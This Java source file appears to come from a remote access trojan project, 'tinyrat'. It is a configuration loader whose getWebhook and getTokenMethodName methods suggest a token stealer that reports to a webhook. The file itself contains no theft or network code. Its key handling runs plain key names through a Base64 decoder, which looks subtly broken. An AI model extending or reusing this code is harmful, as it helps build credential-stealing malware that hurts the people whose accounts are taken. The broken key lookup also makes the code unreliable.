package com.github.tinyrat.utils;

import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

import com.github.tinyrat.utils.Base64Helper;

public class ConfigLoader {
    private static final Properties props = new Properties();

    static {
        try (InputStream in = ConfigLoader.class.getResourceAsStream("/config.properties")) {
            if (in != null) {
                props.load(in);
            } else {
                System.err.println("Could not find config.properties in resources!");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String getProperty(String key) {
        return props.getProperty(Base64Helper.decode(key));
    }

    public static String getWebhook() {
        return getProperty("webhook");
    }

    public static String getTokenMethodName() {
        return getProperty("getTokenMethodName");
    }
}
